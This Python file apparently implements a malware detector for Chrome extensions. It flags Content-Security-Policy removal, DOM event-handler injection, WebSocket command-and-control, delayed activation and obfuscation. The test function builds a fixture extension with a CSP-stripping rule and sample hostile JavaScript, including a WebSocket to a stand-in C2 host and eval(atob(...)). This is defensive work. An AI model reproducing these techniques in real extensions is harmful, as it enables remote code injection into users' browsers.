"""
Advanced Malware Detection Techniques
Based on Wladimir Palant's analysis of sophisticated Chrome extension malware
"""

import re
import json
from pathlib import Path


class AdvancedDetector:
    """Detect advanced malware techniques used in Chrome extensions"""

    def __init__(self):
        """Initialize advanced detector"""
        self.findings = []

    def detect_csp_manipulation(self, extension_path):
        """
        Detect Content-Security-Policy removal attacks
        ANY removal of CSP on main_frame = CONFIRMED MALWARE

        Args:
            extension_path: Path to unpacked extension

        Returns:
            list: List of CSP manipulation findings
        """
        findings = []
        extension_path = Path(extension_path)

        # Check manifest.json for declarativeNetRequest permissions
        manifest_file = extension_path / 'manifest.json'

        if not manifest_file.exists():
            return findings

        try:
            with open(manifest_file, 'r', encoding='utf-8') as f:
                manifest = json.load(f)

            # Check if extension uses declarativeNetRequest
            permissions = manifest.get('permissions', [])
            if 'declarativeNetRequest' not in permissions:
                return findings

            # Check static rules file
            dnr_rules = manifest.get('declarative_net_request', {})
            rule_files = dnr_rules.get('rule_resources', [])

            for rule_resource in rule_files:
                rule_file_path = extension_path / rule_resource.get('path', '')

                if not rule_file_path.exists():
                    continue

                try:
                    with open(rule_file_path, 'r', encoding='utf-8') as f:
                        rules = json.load(f)

                    # Analyze each rule
                    for rule in rules:
                        action = rule.get('action', {})
                        condition = rule.get('condition', {})

                        # Check for CSP removal
                        response_headers = action.get('responseHeaders', [])

                        for header in response_headers:
                            header_name = header.get('header', '').lower()
                            operation = header.get('operation', '')

                            # CRITICAL: CSP removal on main_frame
                            if header_name == 'content-security-policy' and operation == 'remove':
                                resource_types = condition.get('resourceTypes', [])

                                if 'main_frame' in resource_types or not resource_types:
                                    findings.append({
                                        'type': 'CSP_REMOVAL_ATTACK',
                                        'severity': 'CRITICAL',
                                        'verdict': 'CONFIRMED MALWARE',
                                        'description': 'Removes Content-Security-Policy on main_frame',
                                        'impact': 'Allows injection of arbitrary remote code, bypassing Manifest V3 protections',
                                        'evidence': {
                                            'rule_id': rule.get('id'),
                                            'file': str(rule_file_path.name),
                                            'rule': rule
                                        },
                                        'recommendation': 'IMMEDIATE REMOVAL REQUIRED - This is a confirmed malware technique'
                                    })

                except json.JSONDecodeError:
                    pass

            # Also check for dynamic rules in background scripts
            findings.extend(self._check_dynamic_csp_removal(extension_path))

        except Exception as e:
            print(f"[Advanced Detection] Error checking CSP manipulation: {e}")

        return findings

    def _check_dynamic_csp_removal(self, extension_path):
        """Check for dynamic CSP removal in JavaScript code"""
        findings = []

        # Patterns for dynamic CSP removal
        patterns = [
            r'declarativeNetRequest\.updateDynamicRules',
            r'Content-Security-Policy',
            r'responseHeaders.*remove',
            r'main_frame'
        ]

        js_files = list(extension_path.glob('**/*.js'))

        for js_file in js_files:
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                # Check if file contains relevant patterns
                if 'declarativeNetRequest' in content and 'Content-Security-Policy' in content:
                    # Look for CSP removal pattern
                    if re.search(r'responseHeaders.*Content-Security-Policy.*remove', content, re.IGNORECASE | re.DOTALL):
                        findings.append({
                            'type': 'DYNAMIC_CSP_REMOVAL',
                            'severity': 'CRITICAL',
                            'verdict': 'CONFIRMED MALWARE',
                            'description': 'Dynamically removes Content-Security-Policy headers',
                            'impact': 'Runtime CSP bypass for remote code injection',
                            'evidence': {
                                'file': str(js_file.name),
                                'location': str(js_file.relative_to(extension_path))
                            },
                            'recommendation': 'IMMEDIATE REMOVAL REQUIRED'
                        })

            except Exception:
                pass

        return findings

    def detect_dom_event_injection(self, extension_path):
        """
        Detect DOM event injection for remote code execution
        Pattern: setAttribute + event handler + dispatchEvent

        Args:
            extension_path: Path to unpacked extension

        Returns:
            list: List of DOM event injection findings
        """
        findings = []
        extension_path = Path(extension_path)

        # Malicious pattern indicators
        indicators = [
            (r'\.setAttribute\s*\(\s*["\']on\w+["\']', 'setAttribute with event handler'),
            (r'\.dispatchEvent\s*\(\s*new\s+CustomEvent', 'dispatchEvent with CustomEvent'),
            (r'\.removeAttribute\s*\(\s*["\']on\w+["\']', 'removeAttribute to hide evidence')
        ]

        js_files = list(extension_path.glob('**/*.js'))

        for js_file in js_files:
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                matches = []
                for pattern, description in indicators:
                    if re.search(pattern, content, re.IGNORECASE):
                        matches.append(description)

                # If we find 2+ indicators, it's highly suspicious
                if len(matches) >= 2:
                    findings.append({
                        'type': 'DOM_EVENT_INJECTION',
                        'severity': 'CRITICAL',
                        'verdict': 'LIKELY MALWARE',
                        'description': 'Uses DOM event injection for remote code execution',
                        'impact': 'Bypasses Manifest V3 remote code restrictions via event handlers',
                        'evidence': {
                            'file': str(js_file.name),
                            'location': str(js_file.relative_to(extension_path)),
                            'indicators_found': matches
                        },
                        'technique': 'Injects server-provided code via setAttribute("onreset", code) + dispatchEvent',
                        'recommendation': 'HIGH PRIORITY - Manual code review required'
                    })

            except Exception:
                pass

        return findings

    def detect_websocket_c2(self, extension_path):
        """
        Detect WebSocket command & control channels

        Args:
            extension_path: Path to unpacked extension

        Returns:
            list: List of WebSocket C2 findings
        """
        findings = []
        extension_path = Path(extension_path)

        js_files = list(extension_path.glob('**/*.js'))

        for js_file in js_files:
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                # Look for WebSocket usage
                ws_pattern = r'new\s+WebSocket\s*\(\s*["\']?([^"\']+)["\']?\s*\)'
                ws_matches = re.findall(ws_pattern, content, re.IGNORECASE)

                for ws_url in ws_matches:
                    # Check for suspicious patterns
                    is_suspicious = False
                    suspicion_reasons = []

                    # Check for high-risk TLDs
                    high_risk_tlds = ['.top', '.xyz', '.club', '.work']
                    if any(tld in ws_url.lower() for tld in high_risk_tlds):
                        is_suspicious = True
                        suspicion_reasons.append('Uses high-risk TLD')

                    # Check for non-standard ports
                    port_match = re.search(r':(\d+)', ws_url)
                    if port_match:
                        port = int(port_match.group(1))
                        if port not in [80, 443, 8080]:
                            is_suspicious = True
                            suspicion_reasons.append(f'Non-standard port: {port}')

                    # Check for dynamic path construction (session IDs, etc.)
                    if re.search(r'\$\{|\+\s*\w+|`\$\{', content[:content.index('WebSocket')+100]):
                        is_suspicious = True
                        suspicion_reasons.append('Dynamic URL construction detected')

                    # Check for wss:// on suspicious domains
                    if ws_url.startswith('wss://'):
                        is_suspicious = True
                        suspicion_reasons.append('Encrypted WebSocket connection')

                    if is_suspicious:
                        severity = 'HIGH' if len(suspicion_reasons) >= 2 else 'MEDIUM'

                        findings.append({
                            'type': 'WEBSOCKET_C2_CHANNEL',
                            'severity': severity,
                            'verdict': 'SUSPICIOUS',
                            'description': 'Potential command & control channel via WebSocket',
                            'impact': 'Real-time bidirectional communication with remote server',
                            'evidence': {
                                'file': str(js_file.name),
                                'location': str(js_file.relative_to(extension_path)),
                                'websocket_url': ws_url,
                                'suspicion_reasons': suspicion_reasons
                            },
                            'recommendation': 'Investigate WebSocket communication purpose and destination'
                        })

            except Exception:
                pass

        return findings

    def detect_delayed_activation(self, extension_path):
        """
        Detect time-bomb/delayed activation patterns

        Args:
            extension_path: Path to unpacked extension

        Returns:
            list: List of delayed activation findings
        """
        findings = []
        extension_path = Path(extension_path)

        # Patterns for delayed activation
        delay_patterns = [
            (r'setTimeout.*\d{5,}', 'Long setTimeout delay (>10 seconds)'),
            (r'setInterval.*\d{4,}', 'Periodic interval check'),
            (r'Date\.now\(\).*[><]=.*\d{10,}', 'Timestamp comparison for activation'),
            (r'cookie.*install.*time', 'Cookie-based install time tracking'),
            (r'chrome\.storage\..*get.*install.*date', 'Storage-based activation timer')
        ]

        js_files = list(extension_path.glob('**/*.js'))

        for js_file in js_files:
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                matches = []
                for pattern, description in delay_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        matches.append(description)

                if matches:
                    findings.append({
                        'type': 'DELAYED_ACTIVATION',
                        'severity': 'HIGH',
                        'verdict': 'SUSPICIOUS',
                        'description': 'Extension may delay malicious behavior to evade detection',
                        'impact': 'Malware remains dormant for days/weeks before activating',
                        'evidence': {
                            'file': str(js_file.name),
                            'location': str(js_file.relative_to(extension_path)),
                            'indicators_found': matches
                        },
                        'technique': 'Time-bomb: Extension tracks install date and delays payload delivery',
                        'recommendation': 'Monitor extension behavior over extended period'
                    })

            except Exception:
                pass

        return findings

    def detect_obfuscation(self, extension_path):
        """
        Detect code obfuscation techniques

        Args:
            extension_path: Path to unpacked extension

        Returns:
            list: List of obfuscation findings
        """
        findings = []
        extension_path = Path(extension_path)

        obfuscation_indicators = [
            (r'_0x[a-f0-9]{4,}', 'Hex-encoded variable names'),
            (r'\\x[0-9a-f]{2}', 'Hex-encoded strings'),
            (r'atob\(', 'Base64 decoding'),
            (r'eval\s*\(', 'Dynamic code evaluation'),
            (r'Function\s*\(\s*["\']', 'Dynamic function construction'),
            (r'\["\w+"\]\["\w+"\]', 'Bracket notation obfuscation')
        ]

        js_files = list(extension_path.glob('**/*.js'))

        for js_file in js_files:
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                # Skip minified libraries (jquery, etc.)
                if 'jquery' in js_file.name.lower() or 'min.js' in js_file.name.lower():
                    continue

                matches = []
                for pattern, description in obfuscation_indicators:
                    if re.search(pattern, content):
                        count = len(re.findall(pattern, content))
                        if count > 5:  # Threshold to avoid false positives
                            matches.append(f"{description} ({count} occurrences)")

                if len(matches) >= 2:
                    severity = 'HIGH' if len(matches) >= 3 else 'MEDIUM'

                    findings.append({
                        'type': 'CODE_OBFUSCATION',
                        'severity': severity,
                        'verdict': 'SUSPICIOUS',
                        'description': 'Code uses obfuscation to hide functionality',
                        'impact': 'Makes malware analysis difficult, hides true intent',
                        'evidence': {
                            'file': str(js_file.name),
                            'location': str(js_file.relative_to(extension_path)),
                            'obfuscation_techniques': matches
                        },
                        'recommendation': 'Manual deobfuscation and analysis required'
                    })

            except Exception:
                pass

        return findings

    def run_all_detections(self, extension_path):
        """
        Run all advanced detection techniques

        Args:
            extension_path: Path to unpacked extension

        Returns:
            dict: All findings categorized by type
        """
        print("\n[Advanced Detection] Running comprehensive malware detection...")

        results = {
            'csp_manipulation': self.detect_csp_manipulation(extension_path),
            'dom_event_injection': self.detect_dom_event_injection(extension_path),
            'websocket_c2': self.detect_websocket_c2(extension_path),
            'delayed_activation': self.detect_delayed_activation(extension_path),
            'obfuscation': self.detect_obfuscation(extension_path)
        }

        # Calculate summary
        critical_count = sum(
            1 for category in results.values()
            for finding in category
            if finding.get('severity') == 'CRITICAL'
        )

        high_count = sum(
            1 for category in results.values()
            for finding in category
            if finding.get('severity') == 'HIGH'
        )

        results['summary'] = {
            'total_findings': sum(len(findings) for findings in results.values() if isinstance(findings, list)),
            'critical_findings': critical_count,
            'high_findings': high_count,
            'verdict': 'MALWARE' if critical_count > 0 else ('SUSPICIOUS' if high_count > 0 else 'CLEAN')
        }

        print(f"[Advanced Detection] Complete - {results['summary']['total_findings']} findings "
              f"({critical_count} critical, {high_count} high)")

        return results


def test_advanced_detector():
    """Test advanced detector"""
    print("=" * 80)
    print("ADVANCED MALWARE DETECTOR TEST")
    print("=" * 80)

    detector = AdvancedDetector()

    # Create test extension structure
    import tempfile
    import os

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create manifest with declarativeNetRequest
        manifest = {
            "manifest_version": 3,
            "name": "Test Extension",
            "version": "1.0",
            "permissions": ["declarativeNetRequest"],
            "declarative_net_request": {
                "rule_resources": [{
                    "id": "ruleset_1",
                    "enabled": True,
                    "path": "rules.json"
                }]
            }
        }

        with open(os.path.join(tmpdir, 'manifest.json'), 'w') as f:
            json.dump(manifest, f)

        # Create malicious rule file
        rules = [{
            "id": 1,
            "priority": 1,
            "action": {
                "type": "modifyHeaders",
                "responseHeaders": [{
                    "header": "Content-Security-Policy",
                    "operation": "remove"
                }]
            },
            "condition": {
                "resourceTypes": ["main_frame"],
                "urlFilter": "*"
            }
        }]

        with open(os.path.join(tmpdir, 'rules.json'), 'w') as f:
            json.dump(rules, f)

        # Create malicious background script
        malicious_code = """
        // DOM Event Injection
        document.setAttribute("onreset", serverCode);
        document.dispatchEvent(new CustomEvent("reset"));
        document.removeAttribute("onreset");

        // WebSocket C2
        const ws = new WebSocket('wss://malicious.top:8443/c2');

        // Delayed activation
        const installTime = localStorage.getItem('install_time');
        if (Date.now() - installTime > 14 * 24 * 60 * 60 * 1000) {
            activateMalware();
        }

        // Obfuscation
        var _0x1234 = "\\x6d\\x61\\x6c\\x69\\x63\\x69\\x6f\\x75\\x73";
        eval(atob(_0x1234));
        """

        with open(os.path.join(tmpdir, 'background.js'), 'w') as f:
            f.write(malicious_code)

        # Run all detections
        print("\nRunning all advanced detections on test extension...\n")
        results = detector.run_all_detections(tmpdir)

        # Display results
        for category, findings in results.items():
            if category == 'summary':
                continue

            if findings:
                print(f"\n{'='*80}")
                print(f"{category.upper().replace('_', ' ')}")
                print('=' * 80)

                for finding in findings:
                    print(f"\n🚨 {finding['type']}")
                    print(f"  Severity: {finding['severity']}")
                    print(f"  Verdict: {finding['verdict']}")
                    print(f"  Description: {finding['description']}")
                    print(f"  Impact: {finding['impact']}")
                    print(f"  Recommendation: {finding['recommendation']}")

        # Display summary
        print(f"\n{'='*80}")
        print("DETECTION SUMMARY")
        print('=' * 80)
        summary = results['summary']
        print(f"Total Findings: {summary['total_findings']}")
        print(f"Critical: {summary['critical_findings']}")
        print(f"High: {summary['high_findings']}")
        print(f"Final Verdict: {summary['verdict']}")


if __name__ == "__main__":
    test_advanced_detector()
